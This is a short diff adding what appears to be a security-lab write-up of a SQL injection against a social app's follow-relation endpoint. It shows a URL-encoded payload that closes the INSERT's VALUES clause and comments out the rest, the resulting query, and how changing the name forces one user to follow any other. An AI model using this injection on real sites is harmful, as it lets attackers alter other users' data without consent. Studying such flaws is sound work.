@@ -1,0 +1,5 @@
+url="now.share/modify_relation/kathy%27%2C%20%27evewilson%27%20%29%20--%20%28%27%20"
+
+SQL Query: "INSERT INTO following_relations (followed_uname, follower_uname) VALUES ('kathy', 'evewilson' ) -- (' ', 'kathy');"
+Removing the commented code: "INSERT INTO following_relations (followed_uname, follower_uname) VALUES ('kathy', 'evewilson' )"
+note that we can change the name "kathy" in the  url to any other user and then the user "evewilson" would follow them.
